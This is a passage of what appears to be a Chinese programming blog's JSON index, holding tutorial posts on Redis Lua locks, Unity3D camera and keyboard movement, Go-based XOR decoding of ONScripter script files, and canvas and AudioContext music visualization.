3 4 5 6  -- 写锁 if redis.call(\u0026#34;hlen\u0026#34;, KEYS[1]..\u0026#34;:read\u0026#34;) then return 0 else return redis.call(\u0026#34;setnx\u0026#34;, KEYS[1]..\u0026#34;:write\u0026#34;, ARGV[1]) end   解读锁 读锁的解除只需要删除 hash table 里的自己就行了。\n1 2  -- 解读锁 return redis.call(\u0026#34;hdel\u0026#34;, KEYS[1]..\u0026#34;:read\u0026#34;, ARGV[1])   解写锁 写锁解除如解除简单锁一样。\n1 2 3 4 5 6  -- 解锁 if redis.call(\u0026#34;get\u0026#34;, KEYS[1]..\u0026#34;:write\u0026#34;) == ARGV[1] then return redis.call(\u0026#34;del\u0026#34;, KEYS[1]..\u0026#34;:write\u0026#34;) else return 0 end   ","date":"2018-12-17T14:57:00+08:00","permalink":"https://nnnewb.github.io/blog/p/python-%E5%AE%9E%E7%8E%B0-redis-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/","title":"python 实现 redis 分布式锁"},{"content":"1 2 3 4 5 6 7 8 9  void HandleKeyboardAction() { var horizontal = Input.GetAxis(\u0026#34;Horizontal\u0026#34;) * PlayerMotionScaleLevel * Time.deltaTime; var vertical = Input.GetAxis(\u0026#34;Vertical\u0026#34;) * PlayerMotionScaleLevel * Time.deltaTime; var motion = transform.rotation * new Vector3(horizontal, 0, vertical); var mag = motion.magnitude; motion.y = 0; Player.transform.position += motion.normalized * mag; }   极其简单的做法，获取到键盘移动的轴之后，用摄像机的旋转四元数乘一下，即可得到旋转后的向量，加上去就 ok 了。\n需要注意的是这里用摄像机的四元数旋转要求摄像机必须只在 x 和 y 两个轴旋转。\n先备份一下三维向量的数量值，这是为了能保证摄像机向上和向下看时，平面 x 和 z 轴上的分量不会过小，保持一致的移动速度。\n用四元数旋转完成后，去除 y 轴的值，使目标只在当前平面上移动。再用算出来的向量的单位向量乘上之前备份的数量值，得到平面上移动的偏移向量。\n最后，算出新的位置坐标。\n","date":"2018-12-17T02:29:00+08:00","permalink":"https://nnnewb.github.io/blog/p/unity3d-%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E7%A7%BB%E5%8A%A8/","title":"unity3d 键盘控制移动"},{"content":"Intro ons 是一个开放源代码的视觉小说引擎，以简单实用出名。本博用 golang 来解密 ons 引擎的.dat和.nt2脚本，主要实践目标是异步解密输出。\n算法 .dat的加密非常简单，一次异或。密码是0x84。\n可以用 go 非常简单粗暴地写出以下代码。\n1 2 3  for i := 0; i \u0026lt; len(buf); i++ { buf[i] ^= 0x84 }   .nt2的加密同样简单，一次异或，密码是0x85 \u0026amp; 0x97。\n可以用 go 非常粗暴地写出以下代码。\n1 2 3  for i := 0; i \u0026lt; len(buf); i++ { buf[i] = (buf[i] ^ (0x85 \u0026amp; 0x97)) - 1 }   异步读文件 go 方式比较多，ioutil或者bufio或者os都有文件模块。这里采用bufio套os.Open的方式读文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  func readFile(p string, outChannel chan []byte) { // 只读方式打开文件 \tfile, err := os.OpenFile(p, os.O_RDONLY, 0644) if err != nil { panic(err) } // 包装一层 bufio  reader := bufio.NewReader(file) // 准备一个保存读取结果的buf \tvar buf = new([1024000]byte) for { // 循环读 \tn, err := reader.Read(buf[:]) // 没有内容了就退出循环 \tif n == 0 { break } if err != nil { panic(err) } // 把读到的结果用 channel 传递给下一道处理工序 \toutChannel \u0026lt;- buf[:n] } defer func() { close(outChannel) err := file.Close() if err != nil { panic(err) } }() }   异步写文件 写文件的方式和读文件的方式差不多，由那几个包提供。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  func writeFile(p string, outChannel chan []byte, done chan bool) { // 只读方式打开文件，已存在文件则清空内容，未存在文件则创建，文件权限 rw-r--r-- \tfile, err := os.OpenFile(p, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0644) if err != nil { panic(err) } writer := bufio.NewWriter(file) for { // 从上一道工序取得解密后的数据  buf, more := \u0026lt;-outChannel // 如果所有数据全部取得，则结束写入 \tif !more { break } // 写入 \t_, err := writer.Write(buf) if err != nil { panic(err) } } defer func() { err := writer.Flush() if err != nil { panic(err) } err = file.Close() if err != nil { panic(err) } done \u0026lt;- true }() }   异步解密 解密过程就像是水管上的过滤器，水流进来处理好，流出去。内容乏善可陈，就直接丢代码好了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  func decodeDat(inChannel chan []byte, outChannel chan []byte) { for { buf, more := \u0026lt;-inChannel if !more { break } for i := 0; i \u0026lt; len(buf); i++ { buf[i] ^= 0x84 } outChannel \u0026lt;- buf } defer func() { close(outChannel) }() } func decodeNt2(inChannel chan []byte, outChannel chan []byte) { for { buf, more := \u0026lt;-inChannel if !more { break } for i := 0; i \u0026lt; len(buf); i++ { buf[i] = (buf[i] ^ (0x85 \u0026amp; 0x97)) - 1 } outChannel \u0026lt;- buf } defer func() { close(outChannel) }() }   调度 严肃地说，我认为这种调度模式是显然不对的。正确的调度方式应该是这样。\n1 2 3 4 5 6 7 8  graph TB; A[cli] --\u0026gt; |启动|B[read worker]; A --\u0026gt; |启动| C[write worker]; A --\u0026gt; |启动| D[decode worker]; A --\u0026gt; |启动| E[scheduler]; E --\u0026gt; |发出读指令| B; B --\u0026gt; |发送来源标识符+内容| D; D --\u0026gt; |发送来源标识符+处理后的内容| C;   对于有多个 worker 的情况，也需要调度器协调才行，不过直觉上来说硬盘读写性能会是先一步的瓶颈。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  func main() { for i := 1; i \u0026lt; len(os.Args); i++ { decodeChannel, outChannel, done := make(chan []byte), make(chan []byte), make(chan bool) p := os.Args[i] go readFile(p, decodeChannel) switch path.Ext(p) { case \u0026#34;.dat\u0026#34;: go decodeDat(decodeChannel, outChannel) case \u0026#34;.nt2\u0026#34;: go decodeNt2(decodeChannel, outChannel) default: log.Println(path.Ext(p)) panic(\u0026#34;Input file should be .dat or .nt2 encrypted script!\u0026#34;) } go writeFile(path.Base(p)+\u0026#34;.txt\u0026#34;, outChannel, done) \u0026lt;-done } }   完整代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131  package main import ( \u0026#34;bufio\u0026#34; \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; \u0026#34;path\u0026#34; ) func main() { for i := 1; i \u0026lt; len(os.Args); i++ { decodeChannel, outChannel, done := make(chan []byte), make(chan []byte), make(chan bool) p := os.Args[i] go readFile(p, decodeChannel) switch path.Ext(p) { case \u0026#34;.dat\u0026#34;: go decodeDat(decodeChannel, outChannel) case \u0026#34;.nt2\u0026#34;: go decodeNt2(decodeChannel, outChannel) default: log.Println(path.Ext(p)) panic(\u0026#34;Input file should be .dat or .nt2 encrypted script!\u0026#34;) } go writeFile(path.Base(p)+\u0026#34;.txt\u0026#34;, outChannel, done) \u0026lt;-done } } func readFile(p string, outChannel chan []byte) { file, err := os.OpenFile(p, os.O_RDONLY, 0644) if err != nil { panic(err) } reader := bufio.NewReader(file) var buf = new([1024000]byte) for { n, err := reader.Read(buf[:]) if n == 0 { break } if err != nil { panic(err) } outChannel \u0026lt;- buf[:n] } defer func() { close(outChannel) err := file.Close() if err != nil { panic(err) } }() } func writeFile(p string, outChannel chan []byte, done chan bool) { file, err := os.OpenFile(p, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0644) if err != nil { panic(err) } writer := bufio.NewWriter(file) for { buf, more := \u0026lt;-outChannel if !more { break } _, err := writer.Write(buf) if err != nil { panic(err) } } defer func() { err := writer.Flush() if err != nil { panic(err) } err = file.Close() if err != nil { panic(err) } done \u0026lt;- true }() } func decodeDat(inChannel chan []byte, outChannel chan []byte) { for { buf, more := \u0026lt;-inChannel if !more { break } for i := 0; i \u0026lt; len(buf); i++ { buf[i] ^= 0x84 } outChannel \u0026lt;- buf } defer func() { close(outChannel) }() } func decodeNt2(inChannel chan []byte, outChannel chan []byte) { for { buf, more := \u0026lt;-inChannel if !more { break } for i := 0; i \u0026lt; len(buf); i++ { buf[i] = (buf[i] ^ (0x85 \u0026amp; 0x97)) - 1 } outChannel \u0026lt;- buf } defer func() { close(outChannel) }() }   ","date":"2018-12-16T23:44:00+08:00","permalink":"https://nnnewb.github.io/blog/p/go%E8%AF%AD%E8%A8%80%E5%AE%9E%E6%88%98%E4%B9%8B%E8%A7%A3%E5%AF%86ons%E8%84%9A%E6%9C%AC/","title":"go语言实战之解密ons脚本"},{"content":"使用了两年多的 One Note，但是 One Note 对代码的支持实在是难受，于是数次折腾之后最终还是选择再找个更合适的笔记工具。\n在知乎上搜了一圈之后，大多数笔记工具收费且不论，最严重的问题反而是对笔记能否生存下去的怀疑。\n大多笔记工具用私有格式来处理富文本（比如可用样式排版有限的 HTML），或者其他奇奇怪怪的格式。且不说这些东西导出来怎么办\u0026hellip;..把笔记多地备份本身就够难受了。\n再者，笔记这玩意儿记了自己都不一定看。偶尔想起来翻一下，还要怀疑自己当初写的什么狗屁玩意儿。\n所以经过这么多考虑\u0026hellip;\u0026hellip;还是直接搭个博客最自由且不会太担心保存的问题了。\n比较别的笔记工具可能密码忘了或长时间不登陆，git 天天用（这里应有自嘲），根本离不开。\n所以想了想，还是转移笔记到博客好了。写笔记可能很随便，写博客总要考据两下的。再说，还可以自定义页面效果，对我这种喜欢折腾的人还是蛮对胃口的。\n总而言之，先挂上去了，就这样。\n","date":"2018-12-16T23:30:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%85%B3%E4%BA%8E%E7%AC%94%E8%AE%B0%E7%9A%84%E8%80%83%E8%99%91/","title":"关于笔记的考虑"},{"content":"Intro 转载请注明来源，可以在测试博客查看完成效果。\n本篇讲述如何从频域数据绘制动态的星空。\n一、使用 Canvas 绘图 1.1 位置和大小 绘制背景的第一要务便是把 canvas 元素放置在背景这一层次上，避免遮盖其他元素。\n对我而言，个人习惯用 css 来设置大小和位置，用 html 来确定渲染顺序而不是 z-index。\n下面是 html 代码。\n1 2 3 4 5 6  \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;canvas id=\u0026#34;background-canvas\u0026#34;\u0026gt;\u0026lt;/canvas\u0026gt; \u0026lt;!-- other elements --\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   下面是 css 代码。\n1 2 3 4 5 6 7 8  #background-canvas { position: fixed; left: 0; top: 0; width: 100vw; height: 100vh; background-color: black; }   fixed确保拖动页面不会令背景也跟随移动。\n其余部分我想应该没什么有疑问的地方。\n1.2 CanvasContext2D 对于 canvas 元素的绘图操作我想很多人应该接触过。\n以绘制圆形为例，使用如下代码。\n1 2 3 4 5 6 7  const canvas = document.getElementById(\u0026#34;background-canvas\u0026#34;); const ctx = canvas.getContext(\u0026#34;2d\u0026#34;); ctx.fillStyle = \u0026#34;#fff\u0026#34;; ctx.beginPath(); ctx.arc(100, 100, 50, 0, Math.PI * 2); // 参数分别为坐标x,y,半径，起始弧度，结束弧度 ctx.fill();   这样就画完了一个实心圆。\n需要注意，canvas 的大小通过 css 设置可能导致画面被拉伸变形模糊，所以最好的办法是绘制前确定一下 canvas 的大小。\n此外需要注意的是，重置大小会导致画面清空，用这种方式可以替代fillRect或者clearRect，有的浏览器平台更快但也有浏览器更慢。可以查阅这篇博文来参考如何提升 canvas 绘图性能。\nfillStyle可以使用 css 的颜色代码，也就是说我们可以写下诸如rgba、hsla之类的颜色，这给我们编写代码提供了很多方便。\n1.3 绘制星星 星空是由星星组成的这显然不用多说了，先来看如何绘制单个星星。\n星星的绘制方法很多，贴图虽然便利但显然不够灵活，我们的星星是要随节奏改变亮度和大小的，利用贴图的话就只能在alpha值和drawImage缩放来处理了。虽然是一种不错的办法，不过这里我使用了RadialGradient来控制绘图。\n PS：RadialGradient 的性能比较差，大量使用会导致明显的性能下降，这是一个显著降低绘制效率的地方。\n 那么，我们先画一个圆（加点细节预警）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  const canvas = document.getElementById(\u0026#34;background-canvas\u0026#34;); const ctx = canvas.getContext(\u0026#34;2d\u0026#34;); // 确保不会变形 canvas.width = canvas.offsetWidth; canvas.height = canvas.offsetHeight; // 参数分别为起始坐标x,y,半径，结束坐标x,y,半径 const gradient = ctx.createRadialGradient(100, 100, 0, 100, 100, 50); gradient.addColorStop(0.025, \u0026#34;#fff\u0026#34;); // 中心的亮白色 gradient.addColorStop(0.1, \u0026#34;rgba(255, 255, 255, 0.9)\u0026#34;); // 核心光点和四周的分界线 gradient.addColorStop(0.25, \u0026#34;hsla(198, 66%, 75%, 0.9)\u0026#34;); // 核心亮点往四周发散的蓝光 gradient.addColorStop(0.75, \u0026#34;hsla(198, 64%, 33%, 0.4)\u0026#34;); // 蓝光边缘 gradient.addColorStop(1, \u0026#34;hsla(198, 64%, 33%, 0)\u0026#34;); // 淡化直至透明 ctx.fillStyle = gradient; ctx.beginPath(); ctx.arc(100, 100, 50, 0, Math.PI * 2); ctx.fill();   可以在codepen查看效果或直接编辑你的星（圈）星（圈）。\n看上去还不错？\n让我们用代码控制它的亮度和大小。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  const canvas = document.getElementById(\u0026#34;background-canvas\u0026#34;); const ctx = canvas.getContext(\u0026#34;2d\u0026#34;); // 确保不会变形 canvas.width = canvas.offsetWidth; canvas.height = canvas.offsetHeight; // 通过energy控制亮度和大小 let energy = 255; let radius = 50; let energyChangeRate = -1; function draw() { requestAnimationFrame(draw); // 定时绘制，requestAnimationFrame比setTimeout更好。  energy += energyChangeRate; // 见过呼吸灯吧？我们让它变亮~再变暗~反复循环~  if (energy \u0026lt;= 0 || energy \u0026gt;= 255) energyChangeRate = -energyChangeRate; // 计算出当前的大小  const r = radius + energy * 0.1; // 清空屏幕  ctx.fillStyle = \u0026#34;black\u0026#34;; ctx.fillRect(0, 0, canvas.width, canvas.height); // 参数分别为起始坐标x,y,半径，结束坐标x,y,半径  const gradient = ctx.createRadialGradient(100, 100, 0, 100, 100, r); gradient.addColorStop(0.025, \u0026#34;#fff\u0026#34;); // 中心的亮白色  gradient.addColorStop(0.1, \u0026#34;rgba(255, 255, 255, 0.9)\u0026#34;); // 核心光点和四周的分界线  gradient.addColorStop( 0.25, `hsla(198, 66%, ${Math.min(75 + energy * 0.01, 100)}%, 0.9)` ); // 核心亮点往四周发散的蓝光  gradient.addColorStop( 0.75, `hsla(198, 64%, ${Math.min(33 + energy * 0.01, 100)}%, 0.4)` ); // 蓝光边缘  gradient.addColorStop(1, \u0026#34;hsla(198, 64%, 33%, 0)\u0026#34;); // 淡化直至透明  ctx.fillStyle = gradient; ctx.beginPath(); ctx.arc(100, 100, r, 0, Math.PI * 2); ctx.fill(); } draw();   可以在codepen查看并编辑效果。\n1.4 封装星星 通常来说粒子系统不大会把单个粒子封装成类，因为函数调用的开销还是蛮大的。。。\n不过在这里我们这里就先这样了，方便理解和阅读。渲染的瓶颈解决之前，粒子函数调用这点开销根本不是回事儿。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  const canvas = document.getElementById(\u0026#34;background-canvas\u0026#34;); const ctx = canvas.getContext(\u0026#34;2d\u0026#34;); // 确保不会变形 canvas.width = canvas.offsetWidth; canvas.height = canvas.offsetHeight; // 用javascript原生的class而不是prototype class Star { constructor(x, y, radius, lightness) { this.radius = radius; this.x = x; this.y = y; this.lightness; } draw(ctx, energy) { // 计算出当前的大小  const r = this.radius + energy * 0.1; // 参数分别为起始坐标x,y,半径，结束坐标x,y,半径  const gradient = ctx.createRadialGradient( this.x, this.y, 0, this.x, this.y, r ); gradient.addColorStop(0.025, \u0026#34;#fff\u0026#34;); // 中心的亮白色  gradient.addColorStop(0.1, \u0026#34;rgba(255, 255, 255, 0.9)\u0026#34;); // 核心光点和四周的分界线  gradient.addColorStop( 0.25, `hsla(198, 66%, ${Math.min(75 + energy * 0.01, 100)}%, 0.9)` ); // 核心亮点往四周发散的蓝光  gradient.addColorStop( 0.75, `hsla(198, 64%, ${Math.min(33 + energy * 0.01, 100)}%, 0.4)` ); // 蓝光边缘  gradient.addColorStop(1, \u0026#34;hsla(198, 64%, 33%, 0)\u0026#34;); // 淡化直至透明  ctx.fillStyle = gradient; ctx.beginPath(); ctx.arc(this.x, this.y, r, 0, Math.PI * 2); ctx.fill(); } } const star = new Star(100, 100, 50); let energy = 255; let energyChangeRate = -1; // 渲染函数来循环渲染！ function render() { requestAnimationFrame(render); energy += energyChangeRate; if (energy \u0026lt;= 0 || energy \u0026gt;= 255) energyChangeRate = -energyChangeRate; // 清空屏幕  ctx.fillStyle = \u0026#34;black\u0026#34;; ctx.fillRect(0, 0, canvas.width, canvas.height); star.draw(ctx, energy); } // 开始渲染动画！ render();   可以在codepen查看代码效果。\n完成！\n1.5 银河 绘制银河的核心在于随机分布的星星绕着同一中心点旋转，分为两步来讲，第一步是随机分布，这很简单，用Math.random就好了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  // star 部分略  class Galaxy { constructor(canvas) { this.stars = []; this.canvas = canvas; this.ctx = canvas.getContext(\u0026#34;2d\u0026#34;); this.energy = 255; this.energyChangeRate = -2; } init(num) { for (let i = 0; i \u0026lt; num; i++) { this.stars.push( // 随机生成一定数量的星星，初始化星星位置和大小。  new Star( Math.random() * this.canvas.width, Math.random() * this.canvas.height, Math.random() * 10 + 1, Math.random() * 30 + 33 ) ); } } render() { this.energy += this.energyChangeRate; if (this.energy \u0026lt;= 0 || this.energy \u0026gt;= 255) this.energyChangeRate = -this.energyChangeRate; // 清空屏幕  this.ctx.fillStyle = \u0026#34;black\u0026#34;; this.ctx.fillRect(0, 0, canvas.width, canvas.height); for (const star of this.stars) { star.draw(this.ctx, this.energy); } } } const canvas = document.getElementById(\u0026#34;background-canvas\u0026#34;); // 确保不会变形 canvas.width = canvas.offsetWidth; canvas.height = canvas.offsetHeight; const galaxy = new Galaxy(canvas); galaxy.init(50); function render() { requestAnimationFrame(render); galaxy.render(); } render();   可以在codepen查看效果和完整代码。\n1.6 旋转起来！ 【加点细节预警】\n接下来我们为星星准备轨道参数，让它们动起来！\n首先修改Star类，加入几个字段。\n1 2 3 4 5 6 7 8 9 10 11 12  class Star { constructor(x, y, radius, lightness, orbit, speed, t) { this.radius = radius; this.x = x; this.y = y; this.lightness; this.orbit = orbit; // 轨道  this.speed = speed; // 运动速度  this.t = t; // 三角函数x轴参数，用 sin/cos 组合计算位置  } // 下略 }   修改初始化代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  // 前略  init(num) { const longerAxis = Math.max(this.canvas.width, this.canvas.height); const diameter = Math.round( Math.sqrt(longerAxis * longerAxis + longerAxis * longerAxis) ); const maxOrbit = diameter / 2; for (let i = 0; i \u0026lt; num; i++) { this.stars.push( // 随机生成一定数量的星星，初始化星星位置和大小。  new Star( Math.random() * this.canvas.width, Math.random() * this.canvas.height, Math.random() * 10 + 1, Math.random() * 30 + 33, Math.random() * maxOrbit, // 随机轨道  Math.random() / 1000, // 随机速度  Math.random() * 100 // 随机位置  ) ); } // 后略   然后在Galaxy里加入控制移动的代码。\n1 2 3 4 5 6 7  move() { for (const star of this.stars) { console.log(star.orbit) star.x = this.canvas.width/2+ Math.cos(star.t) * star.orbit; star.y = this.canvas.height/2+ Math.sin(star.t) * star.orbit/2; star.t += star.speed; }   然后每一帧进行移动！\n1 2 3 4 5  function render() { requestAnimationFrame(render); galaxy.render(); galaxy.move(); // 动起来！ }   大功告成！\n在codepen查看完整源码！\n1.7 待续  PS：不保证粘贴的代码都能跑，反正 codepen 上是都能的。\n ","date":"2018-11-08T21:41:00+08:00","permalink":"https://nnnewb.github.io/blog/p/audiocontext-%E6%8A%80%E6%9C%AF%E5%92%8C%E9%9F%B3%E4%B9%90%E5%8F%AF%E8%A7%86%E5%8C%962/","title":"AudioContext 技术和音乐可视化（2）"},{"content":"Intro 因为自己搭了个博客，一时兴起，就想写个动态的博客背景。毕竟用 django 后端渲染，前端只有 jquery 和 bootstrap 已经够 low 了，虽说极简风格也很棒，但是多少有点亮眼的东西才好办不是吗。\n转载注明来源。\n为了方便讲解，整个思路分为两个部分：音乐播放和背景绘制。\n一、音乐播放 1.1 AudioContext 概述部分懒得自己写，参考 MDN 的描述。\n AudioContext接口表示由音频模块连接而成的音频处理图，每个模块对应一个AudioNode。AudioContext可以控制它所包含的节点的创建，以及音频处理、解码操作的执行。做任何事情之前都要先创建AudioContext对象，因为一切都发生在这个环境之中。\n 1.2 浏览器支持状况 AudioContext标准目前还是草案，不过新 chrome 已经实现了。我使用的 chrome 版本如下。\n1  版本 70.0.3538.77（正式版本） （64 位）   如果发现 console 报错或者其他问题请检查浏览器版本，所有支持的浏览器可以在这个链接查看。\n1.3 AudioContext 和音频处理图 关于AudioContext我的了解不是很深入，所以只在需要用到的部分进行概述。\n首先，关于音频处理图的概念。\n这个名词不甚直观，我用过虚幻，所以用虚幻的Blueprint来类比理解。音频处理图，其实是一系列音频处理的模块，连接构成一张数据结构中的“图”，从一般使用的角度来讲，一个播放音频的图，就是AudioSource -\u0026gt; AudioContext.destination，两个节点构成的图。其中有很多特殊的节点可以对音频进行处理，比如音频增益节点GainNode。\n对于音频处理的部分介绍就到这里为止，毕竟真的了解不多，不过从 MDN 的文档看，可用的处理节点还是非常多的，就等标准制订完成了。\n1.4 加载音频文件并播放 音频文件加载使用典型的JavaScript接口FileReader实现。\n一个非常简单的实例是这样\n首先是 html 里写上 input\n1 2 3 4 5  \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; accept=\u0026#34;audio/*\u0026#34; onchange=\u0026#34;onInputChange\u0026#34; /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   然后在 javascript 里读文件内容。\n1 2 3 4 5 6 7  function onInputChange(files) { const reader = new FileReader(); reader.onload = (event) =\u0026gt; { // event.target.result 就是我们的文件内容了  }; reader.readAsArrayBuffer(files[0]); }   文件读取就是这么简单，所以回到那个问题：说了那么多，音乐到底怎么放？\n答案是用AudioContext的decodeAudioData方法。\n所以从上面的 js 里做少许修改——\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  // 创建一个新的 AudioContext const ctx = new AudioContext(); function onInputChange(files) { const reader = new FileReader(); reader.onload = (event) =\u0026gt; { // event.target.result 就是我们的文件内容了  // 解码它  ctx.decodeAudioData(event.target.result).then((decoded) =\u0026gt; { // 解码后的音频数据作为音频源  const audioBufferSourceNode = ctx.createBufferSource(); audioBufferSourceNode.buffer = decoded; // 把音源 node 和输出 node 连接，boom——  audioBufferSourceNode.connect(ctx.destination); audioBufferSourceNode.start(0); // 收工。  }); }; reader.readAsArrayBuffer(files[0]); }   1.5 分析频谱 频谱的概念我建议搜一下傅里叶变换，关于时域和频域转换的计算过程和数学原理直接略（因为不懂），至今我还只理解到时域和频域的概念以及傅里叶变换的实现接受采样返回采样数一半长的频域数据\u0026hellip;\u0026hellip;\n不班门弄斧了。\n以前写python的时候用的numpy来进行傅里叶变换取得频域数据，现在在浏览器上用 js 着实有些难受。不过幸好，AudioContext直接支持了一个音频分析的 node，叫做AudioAnalyserNode。\n这个 Node 处于音源 Node 和播放输出 Node 之间，想象一道数据流，音源 Node 把离散的采样数据交给 Analyser，Analyser 再交给输出 Node。\n直接看代码实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  // 创建一个新的 AudioContext const ctx = new AudioContext(); // 解码后的音频数据作为音频源 // 为了方便管理，将这些Node都放置在回调函数外部 const audioBufferSourceNode = ctx.createBufferSource(); // 创建音频分析Node! const audioAnalyser = ctx.createAnalyser(); // 注意注意！这里配置傅里叶变换使用的采样窗口大小！比如说，我们要256个频域数据，那么采样就应该是512。 // 具体对应频率请自行搜傅里叶变换相关博文。 audioAnalyser.fftSize = 512; function onInputChange(files) { const reader = new FileReader(); reader.onload = (event) =\u0026gt; { // event.target.result 就是我们的文件内容了  // 解码它  ctx.decodeAudioData(event.target.result).then((decoded) =\u0026gt; { // 停止原先的音频源  audioBufferSourceNode.stop(); // 先把音频源Node和Analyser连接。  audioBufferSourceNode.connect(audioAnalyser); // 然后把Analyser和destination连接。  audioAnalyser.connect(ctx.destination); // 修改音频源数据  audioBufferSourceNode.buffer = decoded; audioBufferSourceNode.start(0); // 收工。  }); }; reader.readAsArrayBuffer(files[0]); } window.requestAnimationFrame(function () { // 读取频域数据  const freqData = new Uint8Array(audioAnalyser.frequencyBinCount); console.log(freqData); });   频域数据是二维的，频率（数组下标）和能量（下标对应值）。悄悄补一句，数学上应该说是该频率函数图像的振幅？\n其实获得了这个频域数据，继续画出我们常见的条状频域图就很容易了。参考我一朋友的博客。misuzu.moe，可以看看效果。\n关于AudioContext的介绍先到此为止，等我找时间继续写。\n PS：代码不保证复制粘贴就能运行，领会精神，遇到问题查查文档。MDN 比我这博客详细多了。\n ","date":"2018-11-07T02:48:00+08:00","permalink":"https://nnnewb.github.io/blog/p/audiocontext%E6%8A%80%E6%9C%AF%E5%92%8C%E9%9F%B3%E4%B9%90%E5%8F%AF%E8%A7%86%E5%8C%961/","title":"AudioContext技术和音乐可视化（1）"},{"content":"Intro 目标是实现目标随摄像机方向的不同而进行不同方向移动——而且，目标不需要随摄像机一起旋转。\n使用摄像机的四元数旋转 1 2 3 4 5 6 7 8 9  void HandleKeyboardAction() { var horizontal = Input.GetAxis(\u0026#34;Horizontal\u0026#34;) * PlayerMotionScaleLevel * Time.deltaTime; var vertical = Input.GetAxis(\u0026#34;Vertical\u0026#34;) * PlayerMotionScaleLevel * Time.deltaTime; var motion = transform.rotation * new Vector3(horizontal, 0, vertical); var mag = motion.magnitude; motion.y = 0; Player.transform.position += motion.normalized * mag; }   极其简单的做法，获取到键盘移动的轴之后，用摄像机的旋转四元数乘一下，即可得到旋转后的向量，加上去就 ok 了。\n需要注意的是这里用摄像机的四元数旋转要求摄像机必须只在 x 和 y 两个轴旋转。\n先备份一下三维向量的数量值，这是为了能保证摄像机向上和向下看时，平面 x 和 z 轴上的分量不会过小，保持一致的移动速度。\n用四元数旋转完成后，去除 y 轴的值，使目标只在当前平面上移动。再用算出来的向量的单位向量乘上之前备份的数量值，得到平面上移动的偏移向量。\n最后，算出新的位置坐标，赋值，完事儿。\n","date":"2018-11-03T18:57:00+08:00","permalink":"https://nnnewb.github.io/blog/p/unity3d-%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E7%89%A9%E4%BD%93%E5%B9%B3%E9%9D%A2%E7%A7%BB%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%AF%B9%E4%BA%8E%E6%91%84%E5%83%8F%E6%9C%BA%E6%96%B9%E5%90%91/","title":"Unity3D 键盘控制物体平面移动（操作相对于摄像机方向）"},{"content":"Intro 主要想探讨的是如何令摄像机随鼠标操作进行旋转和移动，摄像机跟随的脚本官方就有 Example。\n方案：独立的角度变量 主要的特点是使用独立的角度变量，每次处理鼠标移动操作都会创建一个新的Quaternion用于计算。\n先看 Demo。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  public class PlayerControls : MonoBehaviour { public GameObject Player; public float Distance; //public float CameraRepositionSpeed;  public float MouseMotionScaleLevel; public bool ReverseAxisY; public float PitchMaximum; public float PitchMinimum; private float _CurrentCameraAngleAroundX; private float _CurrentCameraAngleAroundY; private Vector3 _PositionTarget; // Use this for initialization  void Start() { } // Update is called once per frame  void Update() { _CurrentCameraAngleAroundX += Input.GetAxis(\u0026#34;Mouse Y\u0026#34;) * MouseMotionScaleLevel * Time.deltaTime * (ReverseAxisY ? -1 : 1); _CurrentCameraAngleAroundY += Input.GetAxis(\u0026#34;Mouse X\u0026#34;) * MouseMotionScaleLevel * Time.deltaTime; _CurrentCameraAngleAroundX = Mathf.Clamp(_CurrentCameraAngleAroundX, PitchMinimum, PitchMaximum); _PositionTarget = Player.transform.position + Quaternion.Euler(_CurrentCameraAngleAroundX, _CurrentCameraAngleAroundY, 0) * (-Player.transform.forward * Distance); //transform.position = Vector3.Lerp(transform.position, _PositionTarget, Time.deltaTime * CameraRepositionSpeed);  transform.position = _PositionTarget; transform.LookAt(Player.transform); } }   